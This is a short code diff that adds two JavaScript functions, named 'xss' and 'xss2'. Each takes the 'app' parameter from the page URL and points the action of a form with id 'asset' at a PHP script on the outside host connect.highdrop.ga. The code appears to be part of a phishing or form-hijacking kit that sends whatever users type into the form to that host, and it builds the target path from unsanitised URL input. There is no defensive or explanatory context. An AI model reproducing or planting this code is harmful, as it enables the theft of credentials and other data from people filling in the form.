@@ -1,0 +1,13 @@
+function xss(){
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app');
+document.getElementById('asset').action = "https://connect.highdrop.ga/"+myParam+"/DEFAULT.php"
+    
+}
+
+function xss2(){
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app');
+document.getElementById('asset').action = "https://connect.highdrop.ga/"+myParam+"/DEFAULT_2.php"
+    
+}
